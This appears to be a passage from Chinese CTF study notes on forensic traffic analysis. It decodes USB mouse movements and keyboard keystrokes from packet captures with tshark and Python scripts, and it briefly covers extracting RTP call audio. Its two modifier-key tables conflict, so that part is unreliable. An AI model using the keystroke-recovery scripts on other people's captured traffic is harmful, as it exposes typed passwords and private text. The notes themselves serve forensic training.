    y_movement = data[2] if data[2] <= 127 else data[2] - 256

    return x_movement, y_movement

# 打开 HID 数据文件
file_path = "usbdata.txt"
positions = [(0, 0)]  # 初始化鼠标位置 (x, y)

with open(file_path, "r") as file:
    for line in file:
        hid_packet = line.strip()
        if len(hid_packet) == 12:  # 确保是有效的 6 字节数据包
            dx, dy = parse_hid_packet(hid_packet)
            # 累加位移，更新鼠标位置
            last_x, last_y = positions[-1]
            positions.append((last_x + dx, last_y + dy))

# 提取 X 和 Y 坐标
x_coords, y_coords = zip(*positions)

# 绘制鼠标轨迹
plt.figure(figsize=(10, 6))
plt.plot(x_coords, y_coords, marker="o", markersize=2, linestyle="-", color="blue")
plt.title("Mouse Movement Trajectory")
plt.xlabel("X Position")
plt.ylabel("Y Position")
plt.grid()
plt.show()

```

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1735809678340-432b68db-bbbd-4f42-8a8c-db471751035b.png)

[https://github.com/WangYihang/USB-Mouse-Pcap-Visualizer.git](https://github.com/WangYihang/USB-Mouse-Pcap-Visualizer.git)



![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1736415001226-999b195d-3617-4508-9831-86c1adab8225.png)

<h3 id="BnQKX">键盘</h3>
和鼠标类似



[https://github.com/todbot/win-hid-dump](https://github.com/todbot/win-hid-dump)

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1736409998597-80bdbb12-36b0-4ae2-8c8c-76ac44ca8f15.png)

+ <font style="color:#DF2A3F;">GET DESCRIPTOR Request DEVICE：这是 USB 的标准请求之一，用于获取设备描述符（Descriptor）。设备描述符包含了有关 USB 设备的信息，例如设备类型、支持的协议、制造商信息等。</font>
    - **bmRequestType: 0x80**
        * 这是一个标志字节，定义了请求的类型。根据 USB 协议，`0x80` 表示这是一个从设备到主机的请求，通常用于设备向主机提供数据。
        * `0x80` 可以拆解为：`Direction (0x80)`：从设备到主机的数据传输。
        * `Type (0x00)`：标准请求。
        * `Recipient (0x01)`：设备本身（设备描述符请求）。
    - **bRequest: GET DESCRIPTOR (6)**
        * 请求类型。`0x06` 表示 GET DESCRIPTOR 请求，这个请求用于从 USB 设备获取描述符信息。
    - **Descriptor Index: 0x00**
        * 这是请求描述符的索引。`0x00` 表示请求的是设备描述符（DEVICE descriptor）。
    - **bDescriptorType: DEVICE (0x01)**
        * 描述符类型。`0x01` 表示这是一个设备描述符（DEVICE descriptor）。设备描述符包含了关于设备的信息，如设备版本、制造商、产品 ID 等。
    - **Language Id: no language specified (0x0000)**
        * 语言 ID。`0x0000` 表示没有指定特定的语言（通常用于字符串描述符），在设备描述符请求中不涉及语言，因此该字段为 `0x0000`。
    - **wLength: 18**
        * `wLength` 表示要返回的数据的长度，单位是字节。`0x18`（18 字节）表示设备描述符的长度。USB 设备描述符的标准长度通常为 18 字节。
+ <font style="color:#DF2A3F;">GET DESCRIPTOR Response DEVICE：这是对之前“GET DESCRIPTOR Request”请求的响应，设备描述符的内容已经被主机返回给 USB 设备。</font>
    - **bLength: 18**
        * 描述符的长度，18 字节是标准的设备描述符长度。
    - **bDescriptorType: 0x01 (DEVICE)**
        * 描述符的类型。`0x01` 表示这是一个设备描述符（DEVICE Descriptor）。
    - **bcdUSB: 0x0200**
        * USB 版本。`0x0200` 表示该设备支持 USB 2.0。
    - **bDeviceClass: Device (0x00)**
        * 设备类。`0x00` 表示该设备没有特定的设备类，通常这种情况下，设备会通过接口描述符（Interface Descriptors）来指定具体的类信息。
    - **bDeviceSubClass: 0**
        * 设备子类。`0` 表示没有指定子类。
    - **bDeviceProtocol: 0 (Use class code info from Interface Descriptors)**
        * 设备协议。`0` 表示设备使用接口描述符中定义的协议（即没有专门的协议，通常由接口描述符指定）。
    - **bMaxPacketSize0: 64**
        * 默认端点 0 的最大数据包大小。`64` 字节表示设备支持每个数据包最大为 64 字节的数据传输。
    - **idVendor: Apple, Inc. (0x05ac)**
        * 设备厂商 ID。`0x05ac` 表示厂商是 Apple（苹果公司）。
    - **idProduct: Aluminium Keyboard (ANSI) (0x024f)**
        * 产品 ID。`0x024f` 表示该设备是 Apple 的 **Aluminium Keyboard (ANSI)**（铝制键盘 ANSI 版本）。
    - **bcdDevice: 0x0103**
        * 设备版本号。`0x0103` 表示设备的版本是 1.03。
    - **iManufacturer: 1**
        * 制造商字符串描述符的索引。`1` 表示设备支持第 1 个字符串描述符，通常是制造商的名字。
    - **iProduct: 2**
        * 产品字符串描述符的索引。`2` 表示设备支持第 2 个字符串描述符，通常是设备的名称（在这个例子中应该是 **Aluminium Keyboard**）。
    - **iSerialNumber: 0**
        * 序列号字符串描述符的索引。`0` 表示设备没有提供序列号。
    - **sbNumConfigurations: 1**
        * 设备支持的配置数。`1` 表示该设备只有一个配置。
+ <font style="color:#DF2A3F;"> GET DESCRIPTOR   请求的是 配置描述符</font>
    - **bmRequestType: 0x80**
        * 这是请求的方向、类型和目标字段。`0x80` 表示：
            + **方向**（Direction）：从设备到主机（0x80）。
            + **请求类型**（Type）：标准请求（0x00）。
            + **接收者**（Recipient）：设备（0x01）。
    - **bRequest: GET DESCRIPTOR (6)**
        * 请求代码为 `0x06`，表示这是一个 **GET DESCRIPTOR** 请求，用来获取设备的描述符。
    - **Descriptor Index: 0x00**
        * 描述符索引。`0x00` 表示请求的描述符是 **配置描述符**，这是设备的配置设置。
    - **bDescriptorType: CONFIGURATION (0x02)**
        * 描述符类型。`0x02` 表示这是一个 **配置描述符**（Configuration Descriptor）。配置描述符包含了有关设备配置的详细信息，比如设备的接口、功率消耗等。
    - **Language Id: no language specified (0x0000)**
        * 语言 ID。`0x0000` 表示没有指定语言，通常用于字符串描述符，但在此请求中不涉及语言。
    - **wLength: 59**
        * 请求的返回数据长度。`59` 字节表示配置描述符的长度。配置描述符可能包含多个字段，通常会比设备描述符要大，包含更多信息，如接口描述符、端点描述符等。
+ <font style="color:#DF2A3F;">GET DESCRIPTOR Response CONFIGURATION 回复配置描述符（Configuration Descriptor）及其相关的 接口描述符（Interface Descriptors）、HID 描述符（HID Descriptor）和 端点描述符（Endpoint Descriptors）</font>
    - 配置描述符（Configuration Descriptor）
        * **bLength: 9：**配置描述符的长度，标准为 9 字节。
        * **bDescriptorType: 0x02 (CONFIGURATION)：**描述符类型，`0x02` 表示这是一个配置描述符（Configuration Descriptor）。
        * **wTotalLength: 59：**配置描述符及其包含的所有接口和端点描述符的总长度（59 字节）。这表示当前配置包含了接口描述符、HID 描述符和端点描述符的详细信息。
        * **bNumInterfaces: 2：**配置中包含的接口数量，这里表示设备有 2 个接口
        * **bConfigurationValue: 1：**配置值，主机通过这个值来选择当前的配置。这里是配置 1。
        * **iConfiguration: 0：**配置描述符的字符串描述符索引。如果为 0，表示没有配置字符串描述符。
        * **Configuration bmAttributes: 0xa0：**配置的属性，`0xa0` 表示：**NOT SELF-POWERED**：设备不是自供电的，而是通过 USB 总线供电。**REMOTE-WAKEUP**：设备支持远程唤醒功能。
        * **bMaxPower: 50 (100mA)：**配置的最大功率消耗，`50` 表示设备的最大功率为 100mA（50 × 2mA）。
    - 接口描述符 0 (Interface Descriptor 0)
        * **bLength: 9：**接口描述符的长度，标准为 9 字节。
        * **bDescriptorType: 0x04 (INTERFACE)：**描述符类型，`0x04` 表示接口描述符（Interface Descriptor）。
        * **bInterfaceNumber: 0：**接口号，这个接口号是 0。
        * **bAlternateSetting: 0：**可选的备用设置（Alternate Setting），通常用于支持多个配置的接口，这里为 0 表示没有备用设置。
        * **bNumEndpoints: 1：**此接口拥有的端点数，这里为 1 个端点。
        * **bInterfaceClass: HID (0x03)：**接口的类，`0x03` 表示 **HID**（人机接口设备）类。
        * **bInterfaceSubClass: Boot Interface (0x01)：**接口子类，`0x01` 表示 **Boot Interface**，用于基本的输入设备如键盘和鼠标。
        * **bInterfaceProtocol: Keyboard (0x01)：**接口协议，`0x01` 表示 **Keyboard**（键盘）。
        * **iInterface: 0：**接口字符串描述符索引，如果为 0 表示没有接口字符串描述符。
    - HID 描述符：**HID 描述符** 的内容没有明确给出，但它通常会包含如下信息：
        * **bLength**：HID 描述符的长度（通常是 9 字节）。
        * **bDescriptorType**：描述符类型（`0x21` 表示 HID 描述符）。
        * **bcdHID**：HID 版本号（如 `0x0111`）。
        * **bCountryCode**：表示 HID 设备支持的国家/地区（如 `0x00` 表示无特定要求）。
        * **bNumDescriptors**：描述符的数量（通常是 1），描述符的类型可以是 **Report Descriptor**，用于定义设备的报告格式。
    - 端点描述符 1 (Endpoint Descriptor 1)
        * **bLength: 7：**端点描述符的长度，标准为 7 字节。
        * **bDescriptorType: 0x05 (ENDPOINT)：**描述符类型，`0x05` 表示端点描述符（Endpoint Descriptor）。
        * **bEndpointAddress: 0x81 (IN Endpoint: 1)：**端点地址，`0x81` 表示该端点是输入端点（IN），端点号为 1。
        * **bmAttributes: 0x03：**端点的属性，`0x03` 表示该端点支持双向数据传输（Interrupt Transfer）。
        * **wMaxPacketSize: 8：**端点的最大数据包大小，`8` 字节。
        * **bInterval: 1：**对于中断传输，`bInterval` 指定数据传输的周期，这里是 1 毫秒。
    - 接口描述符 1 (Interface Descriptor 1)
        * **bLength: 9：**接口描述符的长度。
        * **bDescriptorType: 0x04 (INTERFACE)：**接口描述符类型。
        * **bInterfaceNumber: 1：**接口号，这个接口号是 1。
        * **bAlternateSetting: 0：**备用设置，0 表示没有备用设置。
        * **bNumEndpoints: 1：**该接口有 1 个端点。
        * **bInterfaceClass: HID (0x03)：**该接口属于 **HID** 类。
        * **bInterfaceSubClass: Boot Interface (0x01)：**该接口属于 **Boot Interface** 子类，通常用于简单的输入设备，如鼠标和键盘。
        * **bInterfaceProtocol: Mouse (0x02)：**该接口使用的是 **鼠标** 协议（`0x02`）。
        * **iInterface: 0：**该接口没有字符串描述符。
    - HID 描述符：**HID 描述符** 的内容同上。
    - 端点描述符 2 (Endpoint Descriptor 2)
        * **bLength: 7：**端点描述符的长度。
        * **bDescriptorType: 0x05 (ENDPOINT)：**端点描述符类型。
        * **bEndpointAddress: 0x82 (IN Endpoint: 2)：**端点地址，`0x82` 表示这是输入端点 2。
        * **bmAttributes: 0x03：**端点属性，`0x03` 表示支持 **中断传输**。
        * **wMaxPacketSize: 16：**端点的最大数据包大小，`16` 字节。
        * **bInterval: 1：**中断传输的间隔，表示每 1 毫秒传输一次。
+ <font style="color:#DF2A3F;">SET CONFIGURATION Request 表示设备正在切换到配置 1，并且没有附加的数据传输。配置设置通常是设备初始化过程的一部分，用于选择设备的工作模式。</font>
    - **bmRequestType: 0x00**
        * 这是请求的方向、类型和目标字段。`0x00` 表示：
            + **方向（Direction）**：主机到设备（0x00），表示这是一个控制请求。
            + **请求类型（Type）**：标准请求（0x00），表示这是 USB 规范中定义的标准请求类型。
            + **接收者（Recipient）**：设备（0x00），请求的目标是设备本身。
    - **bRequest: SET CONFIGURATION (9)：**请求代码为 `0x09`，表示这是一个 **SET CONFIGURATION** 请求。该请求用于设置设备的配置。
    - **SET CONFIGURATION**：请求使得设备进入指定的配置模式，并且根据配置值启用相关的接口和功能。
    - **bConfigurationValue: 1**：配置值，这个值指示设备应该选择哪个配置。在此例中，配置值为 1，表示设备将启用配置编号为 1 的配置。
    - **wIndex: 0 (0x0000)：**`wIndex` 字段通常用于某些特定的请求来提供附加信息（如接口编号或语言 ID）。在此请求中，`wIndex` 为 `0x0000`，表示没有指定附加信息。
    - **wLength: 0：**`wLength` 字段通常表示请求的数据长度。在 `SET CONFIGURATION` 请求中，通常没有额外的数据需要传输，因此该字段值为 0。
+ <font style="color:#DF2A3F;">SET CONFIGURATION Response 确认响应，表示设备已经选择并启用了配置 1。这个响应包本身并不包含额外的数据，它只是用来确认配置设置已成功应用。</font>





可通过GET DESCRIPTOR Response CONFIGURATION的接口描述符（Interface Descriptor）和 设备描述符（GET DESCRIPTOR Response DEVICE）识别设备类型

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1736414217330-b4e101da-5039-4c50-aef1-36cba21f46ab.png)

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1736414369815-2ac95220-9098-4ba7-8dee-5d9a437ec7b0.png)





分析键盘流量

+ 键盘HID
+ 常用 8 字节（64位，在计算机中1字节=8位）：
    - 第 1 字节：修饰键Modifier Keys状态（如 Ctrl、Shift）。
    - 第 2 字节：常为空，占位符。
    - 第 3-8 字节：按下的普通键码列表。



HID Data: 0000100000000000，这段数字有16个字符，它在wireshark是以16进制方式展现。十六进制两位一个字节。

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1736493038645-cf1df10e-f1fa-4d5d-9c6e-2683684ae616.png)

映射表

[https://wenku.baidu.com/view/9050c3c3af45b307e971971e.html?_wkts_=1736493070839](https://wenku.baidu.com/view/9050c3c3af45b307e971971e.html?_wkts_=1736493070839)

+ **字节 1 (修饰键字节)**: 6个位表示修饰键的状态，1位表示按下的修饰键，0表示没有按下。
    - **修饰键：**
    - **0x01****: 左 Shift**
    - **0x02****: 右 Shift**
    - **0x04****: 左 Ctrl**
    - **0x08****: 右 Ctrl**
    - **0x10****: 左 Alt**
    - **0x20****: 右 Alt**
    - **0x40****: 左 Windows 键**
    - **0x80****: 右 Windows 键**
    - **0x39: Caps Lock**
+ **字节 2-8 (按键值字节)**: 每个字节表示按下的键（最多6个键）。按键值的对应关系如下：
+ USB HID键盘映射表

```plain
按键值	键盘按键名称
0x04	A
0x05	B
0x06	C
0x07	D
0x08	E
0x09	F
0x0A	G
0x0B	H
0x0C	I
0x0D	J
0x0E	K
0x0F	L
0x10	M
0x11	N
0x12	O
0x13	P
0x14	Q
0x15	R
0x16	S
0x17	T
0x18	U
0x19	V
0x1A	W
0x1B	X
0x1C	Y
0x1D	Z
0x1E	1 (数字键)
0x1F	2 (数字键)
0x20	3 (数字键)
0x21	4 (数字键)
0x22	5 (数字键)
0x23	6 (数字键)
0x24	7 (数字键)
0x25	8 (数字键)
0x26	9 (数字键)
0x27	0 (数字键)
0x28	Enter/Return
0x29	Escape
0x2A	Backspace
0x2B	Tab
0x2C	Spacebar
0x2D	Minus (-)
0x2E	Equal (=)
0x2F	LeftBracket ([)
0x30	RightBracket (])
0x31	Backslash ()
0x32	Semicolon (;)
0x33	Quote (')
0x34	Grave (`)
0x35	Comma (,)
0x36	Period (.)
0x37	Slash (/)
0x38	Caps Lock
0x39	F1
0x3A	F2
0x3B	F3
0x3C	F4
0x3D	F5
0x3E	F6
0x3F	F7
0x40	F8
0x41	F9
0x42	F10
0x43	F11
0x44	F12
0x45	PrintScreen
0x46	Scroll Lock
0x47	Pause
0x48	Insert
0x49	Home
0x4A	Page Up
0x4B	Delete
0x4C	End
0x4D	Page Down
0x4E	Arrow Right
0x4F	Arrow Left
0x50	Arrow Down
0x51	Arrow Up
0x52	Num Lock
0x53	Keypad /
0x54	Keypad *
0x55	Keypad -
0x56	Keypad +
0x57	Keypad Enter
0x58	Keypad 1
0x59	Keypad 2
0x5A	Keypad 3
0x5B	Keypad 4
0x5C	Keypad 5
0x5D	Keypad 6
0x5E	Keypad 7
0x5F	Keypad 8
0x60	Keypad 9
0x61	Keypad 0
0x62	Keypad .
```



修饰键，这里的单位是bit，表示位，而我们wireshark里的hiddata是16进制，需要转换才能得到对应的修饰键

```plain
位（Bit）  键值（Hex） 	描述
0          0x01    		  左Ctrl
1          0x02         左Shift
2          0x04         左Alt
3          0x08         左Win键
4          0x10         右Ctrl
5          0x20         右Shift
6          0x40         右Alt
7          0x80         右Win键
```

例如：

hiddata：0200000000000000，按修饰键映射表，为左shift键

hiddata：0800190000000000，按修饰键映射表，为左win键

hiddata：0300000000000000，按修饰键映射表，没有，0x03=二进制00000011

00000011第0位及00000001=左ctrl

00000011第1位及00000010=左shift

所以0300000000000000=同时按下左边ctrl与shift键

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1736756244049-d483a958-3f7e-49aa-9b13-649c143cadd4.png)



USB HID报告通常是多个字节（8位为1字节）组成的，键盘数据报文通常至少有8个字节，表示修饰键、按键状态等，根据映射表和USB HID报告分析这一个HIDdata数据。



0000100000000000

将这个hiddata 分开

00 00 10 00 00 00 00 00

第一字节修饰符为空 第二字节为占位也为空 第三字节为 10，根据映射表，0x10=m，所以第一个按下的键盘是m





通过tshark批量提取hiddata

```python
tshark -r 111.pcapng -T fields -e usbhid.data | sed '/^\s*$/d' > usbdata.txt
```

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1736495267074-c57fec32-998e-4d46-9e7d-6ecb50ba6cd5.png)

通过python脚本批量解析输出



```python
def parse_hid_data(hid_data):
    data = int(hid_data, 16)
    keys = []
    unknown_keys = []

    # 修饰键字节
    modifier_byte = (data >> 8) & 0xFF
    if modifier_byte & 0x02:
        keys.append('LeftShift')
    if modifier_byte & 0x04:
        keys.append('RightShift')
    if modifier_byte & 0x01:
        keys.append('LeftCtrl')
    if modifier_byte & 0x08:
        keys.append('RightCtrl')
    if modifier_byte & 0x10:
        keys.append('LeftAlt')
    if modifier_byte & 0x20:
        keys.append('RightAlt')
    if modifier_byte & 0x40:
        keys.append('LeftWin')
    if modifier_byte & 0x80:
        keys.append('RightWin')

    # 普通按键字节
    for i in range(3, 8):
        key_code = (data >> (i * 8)) & 0xFF
        if key_code > 0:
            if key_code in HID_KEY_MAP:
                keys.append(HID_KEY_MAP[key_code])
            else:
                unknown_keys.append(f"Unknown (0x{key_code:02X})")  # 未识别的键码

    return keys, unknown_keys

def process_keys_to_text(all_keys):
    result_text = []
    for key in all_keys:
        if key == 'Backspace':
            if result_text:  # 如果已有字符输入，删除最后一个
                result_text.pop()
        elif key not in ['F1', 'F2']:  # 忽略功能键
            result_text.append(key)
    return ''.join(result_text)

def main():
    all_keys = []
    unknown_keys_set = set()  # 收集所有未知键码
    line_outputs = []  # 存储逐行解析输出
    with open('usbdata.txt', 'r') as f:
        for line in f:
            line = line.strip()
            if line:  # 如果不是空行
                keys, unknown_keys = parse_hid_data(line)
                all_keys.extend(keys)  # 添加解析出的正常按键
                unknown_keys_set.update(unknown_keys)  # 收集未知键码

                # 按逐行输出格式记录
                if keys or unknown_keys:
                    line_outputs.append(f"Parsed keys: {keys + unknown_keys}")
                else:
                    line_outputs.append("Parsed keys: []")

    # 处理键盘输入，不含空格
    parsed_text = process_keys_to_text(all_keys)

    # 输出逐行解析格式
    print("Line-by-Line Parsed Keys:")
    for line in line_outputs:
        print(line)

    # 输出最终文本内容
    print("\nFinal Parsed Text (no spaces):")
    print(parsed_text)

    # 输出未识别的键码
    if unknown_keys_set:
        print("\nUnknown keys encountered:")
        for unknown_key in sorted(unknown_keys_set):
            print(unknown_key)

if __name__ == '__main__':
    # 键盘 HID 映射表
    HID_KEY_MAP = {
        0x04: 'a', 0x05: 'b', 0x06: 'c', 0x07: 'd',
        0x08: 'e', 0x09: 'f', 0x0A: 'g', 0x0B: 'h',
        0x0C: 'i', 0x0D: 'j', 0x0E: 'k', 0x0F: 'l',
        0x10: 'm', 0x11: 'n', 0x12: 'o', 0x13: 'p',
        0x14: 'q', 0x15: 'r', 0x16: 's', 0x17: 't',
        0x18: 'u', 0x19: 'v', 0x1A: 'w', 0x1B: 'x',
        0x1C: 'y', 0x1D: 'z', 0x1E: '1', 0x1F: '2',
        0x20: '3', 0x21: '4', 0x22: '5', 0x23: '6',
        0x24: '7', 0x25: '8', 0x26: '9', 0x27: '0',
        0x28: 'Enter', 0x29: 'Escape', 0x2A: 'Backspace',
        0x2B: 'Tab', 0x2C: ' ', 0x2D: '-', 0x2E: '=',
        0x2F: '[', 0x30: ']', 0x31: '\\', 0x32: '#',
        0x33: ';', 0x34: '\'', 0x35: '`', 0x36: ',',
        0x37: '.', 0x38: '/', 0x3A: 'F1', 0x3B: 'F2',
        # 添加其他必要的键码映射
    }

    main()
```

```python
normalKeys = {"04":"a", "05":"b", "06":"c", "07":"d", "08":"e", "09":"f", "0a":"g", "0b":"h", "0c":"i", "0d":"j", "0e":"k", "0f":"l", "10":"m", "11":"n", "12":"o", "13":"p", "14":"q", "15":"r", "16":"s", "17":"t", "18":"u", "19":"v", "1a":"w", "1b":"x", "1c":"y", "1d":"z","1e":"1", "1f":"2", "20":"3", "21":"4", "22":"5", "23":"6","24":"7","25":"8","26":"9","27":"0","28":"<RET>","29":"<ESC>","2a":"<DEL>", "2b":"\t","2c":"<SPACE>","2d":"-","2e":"=","2f":"[","30":"]","31":"\\","32":"<NON>","33":";","34":"'","35":"<GA>","36":",","37":".","38":"/","39":"<CAP>","3a":"<F1>","3b":"<F2>", "3c":"<F3>","3d":"<F4>","3e":"<F5>","3f":"<F6>","40":"<F7>","41":"<F8>","42":"<F9>","43":"<F10>","44":"<F11>","45":"<F12>"}

shiftKeys = {"04":"A", "05":"B", "06":"C", "07":"D", "08":"E", "09":"F", "0a":"G", "0b":"H", "0c":"I", "0d":"J", "0e":"K", "0f":"L", "10":"M", "11":"N", "12":"O", "13":"P", "14":"Q", "15":"R", "16":"S", "17":"T", "18":"U", "19":"V", "1a":"W", "1b":"X", "1c":"Y", "1d":"Z","1e":"!", "1f":"@", "20":"#", "21":"$", "22":"%", "23":"^","24":"&","25":"*","26":"(","27":")","28":"<RET>","29":"<ESC>","2a":"<DEL>", "2b":"\t","2c":"<SPACE>","2d":"_","2e":"+","2f":"{","30":"}","31":"|","32":"<NON>","33":"\"","34":":","35":"<GA>","36":"<","37":">","38":"?","39":"<CAP>","3a":"<F1>","3b":"<F2>", "3c":"<F3>","3d":"<F4>","3e":"<F5>","3f":"<F6>","40":"<F7>","41":"<F8>","42":"<F9>","43":"<F10>","44":"<F11>","45":"<F12>"}


nums = []
keys = open(r"./usbdata.txt")
for line in keys:
    if len(line)!=17: #首先过滤掉鼠标等其他设备的USB流量
        continue
    nums.append(line[0:2]+line[4:6]) #取一、三字节
keys.close()
output = ""
for n in nums:
    if n[2:4] == "00" :
        continue

    if n[2:4] in normalKeys:
        if n[0:2]=="02": #表示按下了shift
            output += shiftKeys [n[2:4]]
        else :
            output += normalKeys [n[2:4]]
    else:
        output += ''
print('output :' + output)
```

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1736496244057-78c055d4-6144-465d-b596-ecb79fcddc78.png)





<h2 id="bZTJ6"><font style="color:rgb(0, 0, 0);">RTP（电话）</font></h2>






![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1736499197262-537c17d6-a62a-4143-8cbe-ebab9e269cef.png)

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1736499236494-2f31a7f2-96cd-4ca6-9372-2ca175c7203c.png)

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1736499297747-f2f744d2-bc7d-4939-8220-5520ea8d6574.png)



![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1736499315934-93647b09-fbf7-4e95-b1ee-3cb48b1314f9.png)

利用buzz进行识别

[https://github.com/chidiwilliams/buzz](https://github.com/chidiwilliams/buzz)

导出wav格式

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1736500592670-11210b56-8929-46f2-85f6-18a340efd32c.png)

识别

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1736500643954-a4c9608a-3a2e-4496-b6df-168c6def8e18.png)

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1736500737564-a0ab7467-1c41-4a6d-b77c-ba8f816f4f3e.png)











<h2 id="BuG0o">ref</h2>
```markdown
数据包
https://gitee.com/fengerxi/large-set-of-ctf-flow-problems
https://www.cnblogs.com/xhzccy/p/17917866.html

usb
https://wenku.baidu.com/view/9050c3c3af45b307e971971e.html?_wkts_=1736493070839
https://blog.csdn.net/guoqx/article/details/122020615
https://blog.csdn.net/HAD_INK/article/details/130153044

哥斯拉
https://mp.weixin.qq.com/s/dhSMye5GqvuquKAW__E3yQ
https://mp.weixin.qq.com/s/Iy-gRa4ubC5gS1xCDVz3lw
https://forum.butian.net/share/2517
https://mp.weixin.qq.com/s/VPWLGL6Ild9VpC2jeqM_dA

冰蝎
https://mp.weixin.qq.com/s/XTbo3lUuwUmptP8mFJLRZw
https://mp.weixin.qq.com/s/j6AV-SfJlPK6JHshea8bEA
https://mp.weixin.qq.com/s/Iy-gRa4ubC5gS1xCDVz3lw

AI
https://chat.deepseek.com/
https://chat.openai.com/
```

